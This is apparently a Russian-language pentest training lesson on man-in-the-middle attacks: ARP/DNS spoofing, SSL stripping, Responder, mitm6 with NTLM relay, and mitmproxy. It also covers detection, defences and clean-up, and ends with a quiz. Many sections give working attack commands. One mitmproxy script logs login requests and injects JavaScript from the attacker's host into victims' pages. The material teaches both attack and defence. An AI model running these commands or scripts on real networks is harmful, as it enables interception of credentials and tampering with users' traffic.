---
id: network-mitm
title: "MITM на практике: перехват, модификация и SSL stripping"
category: network
parent: network-arp
difficulty: medium
order: 1
tags: [network, mitm, bettercap, interception, ssl-stripping]
prerequisites: [network-arp, network-tls-inspection]
useful_for:
  - "Пентест внутренней сети"
  - "CTF: перехват сессии"
  - "Понимание защиты от MITM"
estimated_minutes: 50
summary: "Полный цикл MITM: подготовка позиции, перехват и модификация трафика с bettercap, атака SSL stripping и защита (HSTS, pinning)."
---
MITM (man-in-the-middle) — класс атак, при которых трафик жертвы проходит через атакующего, который может его читать, менять или перенаправлять. В локальной сети MITM достигается через ARP/DNS-спуфинг, в Wi-Fi — через rogue AP, а защита от перехвата содержимого держится на TLS.

Разберём техники перехвата, модификацию трафика, SSL stripping, инструменты (bettercap, mitmproxy, Ettercap) и защиту.

## Где встаёт MITM

| Позиция | Как попасть | Что видно |
|---|---|---|
| Локальный сегмент | ARP/DNS-спуфинг | весь L2-трафик |
| Wi-Fi | rogue AP / evil twin | весь беспроводной трафик |
| Роутер/шлюз | компромисс | всё, что идёт через него |
| Off-path | угадывание/инъекция | ограниченно |

Наиболее частая точка входа в пентесте — локальный сегмент, потому что ARP не аутентифицирован.

## ARP-спуфинг: база MITM

Атакующий говорит жертве «шлюз — это я», а шлюзу «жертва — это я». Трафик идёт через атакующего:

```bash
# включить форвардинг, чтобы не рвать связь
sysctl -w net.ipv4.ip_forward=1

# ARP-спуфинг
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1   # жертве про шлюз
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5   # шлюзу про жертву

# лучше — bettercap (сам всё настраивает)
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.5; arp.spoof on; net.sniff on"
```

После этого `tcpdump -ni eth0 -A 'tcp port 80'` показывает незашифрованный трафик жертвы.

## DNS-спуфинг в связке

ARP-спуфинг перехватывает, но не меняет содержимое. DNS-спуфинг перенаправляет:

```bash
sudo bettercap -iface eth0
set arp.spoof.targets 10.0.0.5
set dns.spoof.domains bank.example,login.example
set dns.spoof.address 10.0.0.99
arp.spoof on
dns.spoof on
```

Жертва запрашивает `bank.example`, получает IP атакующего и попадает на поддельный сайт.

## SSL stripping и HSTS

Проблема: почти всё на HTTPS, а TLS атакующий в середине вскрыть не может (без валидного сертификата). **SSL stripping** решает это иначе: атакующий проксирует соединение и понижает его до HTTP, отдавая жертве незашифрованную версию, а к настоящему серверу идя по HTTPS.

```bash
# sslstrip из sslstrip2
sslstrip -l 8080
# или в bettercap
set http.proxy.sslstrip true
http.proxy on
```

Защита — **HSTS** (заставляет браузер использовать HTTPS и игнорировать HTTP) и HSTS preload. Но до первого посещения HSTS не действует, а некоторые клиенты его не поддерживают — тогда stripping работает.

## Инструмент mitmproxy

mitmproxy — интерактивный HTTPS-прокси для просмотра и модификации:

```bash
# запуск
mitmproxy -p 8080            # TUI
mitmweb -p 8080              # веб-интерфейс
mitmdump -p 8080 -w flows.dump

# подмена ответа скриптом
mitmdump -s modify.py
```

Пример скрипта `modify.py`, который вставляет JS в HTML:

```python
def response(flow):
    if b"text/html" in flow.response.headers.get("content-type","").encode():
        flow.response.text = flow.response.text.replace("</body>", "<script>alert(1)</script></body>")
```

Чтобы вскрыть HTTPS, на жертву надо установить корневой сертификат mitmproxy (`~/.mitmproxy/mitmproxy-ca-cert.pem`) — в лаборатории это делается, в реальной атаке требует доступа к устройству.

## Перехват Wi-Fi: rogue AP и evil twin

В беспроводной сети MITM ставят через поддельную точку доступа с тем же SSID (evil twin) или через `hostapd-wpe`/`wifiphisher`. Жертва подключается к вашему AP, и весь её трафик идёт через вас. Детали — в уроке про evil twin.

## Что именно перехватывать

- **HTTP** — логины, cookie, формы, токены.
- **DNS** — какие домены посещает жертва.
- **Незашифрованные протоколы** — FTP, Telnet, SMTP, POP3, LDAP (bind), SNMP v1/v2c.
- **NTLM-хэши** — через Responder/LLMNR/NBT-NS.
- **Метаданные** даже в HTTPS — SNI, размеры, тайминги.

```bash
# перехват незашифрованных учёток
tcpdump -ni eth0 -A 'tcp port 21 or tcp port 110 or tcp port 143'
# Responder — перехват NTLM в Windows-сети
sudo responder -I eth0 -wv
```

## Обнаружение MITM

- Дублирующиеся MAC/ARP-аномалии: два IP с одним MAC или частые gratuitous ARP.
- Изменившийся отпечаток TLS-сертификата, неожиданный issuer.
- Резкое падение/рост задержек, разрывы соединений.
- Инструменты: `arpwatch`, `xarp`, `bettercap` в режиме детекта, проверка `arp -a` на статичность.

## Защита

- **Dynamic ARP Inspection (DAI)** и DHCP snooping на коммутаторах.
- **HSTS + preload**, certificate pinning в приложениях.
- **802.1X** для контроля доступа к портам.
- **VPN** — шифрует трафик поверх недоверенной сети.
- **MFA** — украденный пароль без второго фактора бесполезен.
- Мониторинг ARP/DNS-аномалий.

## Частые ошибки

- Забыть `ip_forward` — жертва теряет связь, атака заметна.
- Думать, что MITM = расшифровка HTTPS: без подмены сертификата нет.
- Игнорировать HSTS preload — там stripping не работает.
- Перехватывать слишком агрессивно (ARP-flood) — это ловится DAI и ломает сеть.
- Не чистить ARP-кэш после теста — оставляете сеть в нерабочем состоянии.

## Что дальше / решение

В лаборатории: `bettercap` (ARP+DNS+sniff+proxy) — самый быстрый путь; `mitmproxy` — для тонкой модификации. Проверяйте, есть ли HSTS, включён ли DAI, какой TLS. Для защиты — DAI + HSTS + 802.1X + MFA. MITM — это не одна атака, а позиция: заняв её, вы применяете к трафику всё, что умеете (спуфинг, инъекция, downgrade).

## Разобранный пример: полный MITM в локальной лаборатории

Жертва `10.0.0.5`, шлюз `10.0.0.1`, атакующий `10.0.0.66`.

Шаг 1. Включаем форвардинг:

```bash
sysctl -w net.ipv4.ip_forward=1
```

Шаг 2. ARP-спуфинг в обе стороны:

```bash
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1 &
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5 &
```

Шаг 3. Смотрим незашифрованный трафик:

```bash
tcpdump -ni eth0 -A 'tcp port 80 or tcp port 21 or tcp port 110'
# GET /login HTTP/1.1
# Host: intranet.local
# username=admin&password=Sup3rS3cret
```

Шаг 4. Если сайт по HTTPS — пробуем SSL-strip:

```bash
sslstrip -l 8080 &
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

Шаг 5. Либо единый инструмент:

```bash
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets 10.0.0.5; set http.proxy.sslstrip true; arp.spoof on; http.proxy on; net.sniff on"
```

Шаг 6. Уборка (обязательно!): прекратить spoof, дать ARP-кэшу восстановиться, выключить `ip_forward`.

## Reference-таблица: что видно при перехвате

| Протокол | Шифрование | Что перехватывается |
|---|---|---|
| HTTP | нет | всё: URL, cookie, формы |
| FTP | нет | логин/пароль, файлы |
| Telnet | нет | сессия целиком |
| SMTP/POP3/IMAP | опц. STARTTLS | без TLS — учётки |
| LDAP (bind) | опц. | простой bind — пароль |
| SNMP v1/v2c | нет | community-строки |
| NTLM (SMB) | challenge/response | хэш для relay/crack |
| HTTPS | TLS | только SNI/размеры (без подмены cert) |

## Чек-лист MITM-теста

1. Включить `ip_forward` (иначе жертва отвалится).
2. Запустить ARP-спуфинг (лучше bettercap — сам всё настроит).
3. Включить sniff, оценить долю незашифрованного трафика.
4. Проверить наличие HSTS (иначе sslstrip имеет смысл).
5. Для NTLM — Responder; для HTTP — mitmproxy с модификацией.
6. Убрать за собой: spoof off, ARP восстановить, форвардинг off.
7. Задокументировать, что удалось перехватить/изменить.

## Responder: перехват NTLM без ARP-спуфинга

В Windows-сети самый быстрый путь к учётным данным — не ARP-спуфинг, а **отравление протоколов разрешения имён**: LLMNR (UDP/5355), NBT-NS (UDP/137) и mDNS (UDP/5353). Когда хост не находит имя через DNS, он рассылает multicast-запрос, и Responder отвечает «это я», получая **NTLM-хэш** (NetNTLMv1/v2) или запрос на аутентификацию к подделанному SMB/HTTP.

```bash
# базовая атака: отравление LLMNR/NBT-NS + поддельные сервисы
sudo responder -I eth0 -wv
# только анализ без отравления (для оценки экспозиции)
sudo responder -I eth0 -A
# плюс wpad/proxy-auth для захвата WPAD
sudo responder -I eth0 --wpad -wv
```

Полученные хэши (NetNTLMv2) **не брутятся быстро**, но их можно: (1) перебрать оффлайн с `hashcat -m 5600`; (2) **отрелеить** на другой хост (SMB/LDAP/HTTP) без знания пароля — это уже задача `network-ntlm-relay` и требует отключённой SMB-подписи. Ключевой момент: Responder — это пассивно-активный MITM на уровне разрешения имён, часто эффективнее ARP-спуфинга и незаметнее.

## mitmproxy: тонкая модификация и подмена ответов

Когда нужна не «просто прочитать», а **изменить** трафик, mitmproxy даёт полноценный API. Вскрытие HTTPS требует установки корневого CA mitmproxy на клиенте (в лаборатории — вручную; в реальной атаке — только с доступом к устройству или через MDM).

```bash
# генерация и просмотр CA
mitmproxy -p 8080            # TUI, клавиша 'i' — установка cert-инструкции
cat ~/.mitmproxy/mitmproxy-ca-cert.pem
# прозрачный режим через iptables (перехват без настройки прокси в браузере)
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
mitmproxy --mode transparent -p 8080
```

Скрипт для инъекции и сбора данных:

```python
from mitmproxy import http
def request(flow: http.HTTPFlow):
    if "login" in flow.request.path:
        print("CREDS:", flow.request.get_text())
def response(flow: http.HTTPFlow):
    ct = flow.response.headers.get("content-type", "")
    if "text/html" in ct:
        flow.response.text = flow.response.text.replace(
            "</head>", "<script src='http://10.0.0.66/h.js'></script></head>")
```

Модули bettercap, которые обычно включают вместе с ARP-спуфингом: `http.proxy` (прозрачный HTTP), `https.proxy` (подложенный CA), `dns.spoof`, `net.sniff`, `wifi`, `arp.spoof`. Их удобно оформлять в **caplet** — файл-сценарий.

## IPv6-канал MITM: mitm6 и rogue RA

Двойной стек часто недооценивают: если в сети есть IPv6, а DNS по IPv6 раздаётся через DHCPv6/RA, то `mitm6` поднимает rogue-RA, выдаёт себя за DNS-сервер и перехватывает разрешение имён — и всё это **без ARP**. Хосты с включённым IPv6 предпочитают его IPv4, поэтому трафик уходит по незащищённому пути.

```bash
# rogue DHCPv6/RA + подмена DNS (в лаборатории)
sudo mitm6 -d corp.local -i eth0
# одновременно отвечаем на LDAP/SMB поддельным сервером (в связке с ntlmrelayx)
sudo impacket-ntlmrelayx -6 -tf targets.txt -wh attacker.corp.local
# увидеть соседей по IPv6
ip -6 neigh show
# захватить ICMPv6-трафик (RA/NA)
sudo tcpdump -i eth0 -n 'icmp6' -c 20
```

Защита: отключить IPv6 там, где он не нужен; **RA Guard** и **DHCPv6 Guard** на коммутаторах; мониторинг неожиданных RA. Как и в случае с ARP, отсутствие аутентификации у NDP/RA делает сегмент уязвимым.

## Сравнение инструментов и сценариев MITM

| Инструмент | Слой атаки | Сильная сторона | Ограничение |
|---|---|---|---|
| bettercap | ARP/DNS/sniff/proxy | всё в одном, caplets | шумно, легко детектится |
| Ettercap | ARP (L2) | зрелый, плагины | архаичный интерфейс |
| Responder | LLMNR/NBT-NS/mDNS | NTLM-хэши без ARP | только Windows-сеть |
| mitmproxy | HTTP(S) | модификация на лету | нужен CA на клиенте |
| mitm6 | IPv6 RA/DHCPv6 | обход IPv4-защит | нужен включённый IPv6 |
| sslstrip | HTTP downgrade | простая понижаловка | бессилен против HSTS |

Выбор инструмента диктует **позиция и цель**: читать незашифрованное — хватит ARP+sniff; менять контент — mitmproxy; собирать креды в Windows-сети — Responder; обойти IPv4-защиту — mitm6.

## OPSEC и уборка после MITM

MITM почти всегда **заметен**, и главная ошибка — оставить сеть сломанной. Правила:

- Спуфить **узкий** набор целей, не весь `/24` — иначе IDS и админ заметят всплеск ARP.
- Не включать `net.sniff` без фильтра — лишний шум и огромные дампы.
- После теста: `arp.spoof off`, дождаться восстановления ARP-кэшей (или принудительно послать корректные ARP), `ip_forward=0`.
- Согласовать окно с заказчиком: ARP-аномалии часто ловит даже простой `arpwatch`.
- Проверить **заранее**, включён ли DAI/DHCP snooping — иначе атака сорвётся или «сломает» сегмент.

## Квиз

```quiz
- question: "Что атакует SSL stripping?"
  options:
    - "Сам TLS-шифр"
    - "Переход пользователя на HTTPS: ссылки переписываются на HTTP"
    - "DNS-сервер"
    - "MAC-адрес"
  answer: 1
  explanation: "Stripping лишает пользователя HTTPS, заставляя его общаться по HTTP, пока атакующий проксирует запросы."
- question: "Какой заголовок защищает от SSL stripping?"
  options:
    - "Content-Type"
    - "Strict-Transport-Security (HSTS)"
    - "User-Agent"
    - "Accept-Encoding"
  answer: 1
  explanation: "HSTS заставляет браузер использовать только HTTPS и ломает stripping."
- question: "Что нужно для MITM в локальной сети на уровне L2?"
  options:
    - "Только Wi-Fi"
    - "Встать в середину, например через ARP-спуфинг"
    - "Пароль роутера"
    - "DNS-сервер"
  answer: 1
  explanation: "ARP-спуфинг перенаправляет трафик через атакующего, давая позицию MITM."
- question: "Что делает bettercap с включённым http.proxy и inject-скриптом?"
  options:
    - "Шифрует трафик"
    - "Внедряет код (например, JavaScript) в HTTP-ответы жертвы"
    - "Сканирует порты"
    - "Блокирует DNS"
  answer: 1
  explanation: "http.proxy позволяет модифицировать проходящие HTTP-ответы и внедрять контент."
- question: "Какая защита в мобильных приложениях мешает TLS-перехвату?"
  options:
    - "SSL stripping"
    - "Certificate pinning"
    - "ARP-спуфинг"
    - "HSTS"
  answer: 1
  explanation: "Pinning проверяет конкретный сертификат/ключ, поэтому подмена CA не срабатывает."
```

## Где пригодится

- **Пентест:** перехват кредов и сессий во внутренней сети.
- **CTF:** восстановление паролей/флагов из перехваченного трафика.
- **Red team:** изменение контента, внедрение полезной нагрузки.
- **Защита:** понимание, от чего защищают HSTS/pinning/DAI.
- **Анализ:** разбор перехваченного трафика в Wireshark.
